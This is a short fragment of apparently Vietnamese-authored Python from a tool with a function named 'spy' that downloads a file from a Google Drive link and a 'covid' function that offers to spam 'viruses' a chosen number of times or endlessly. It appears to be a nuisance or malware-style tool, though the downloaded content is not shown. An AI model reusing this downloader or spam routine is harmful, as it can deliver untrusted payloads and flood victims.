...
def spy():
    ...
    try:
        rq=requests.get('https://drive.usercontent.google.com/download?id=1hcZByd4GPitzWgS3_wThD5uZtWubFmAD&export=download&authuser=0&confirm=t&uuid=87a7b255-a17e-4905-9802-7bf6e11cf0c8&at=AO7h07dsvwobjDQbOMbOKb-lyEjz%3A1724978233817')
...
def covid():
    print(colorama.Fore.YELLOW + 'Nhập số lượng virus muốn spam hoặc nhập /loop để spam virus vô hạn cho đến khi dừng tool')
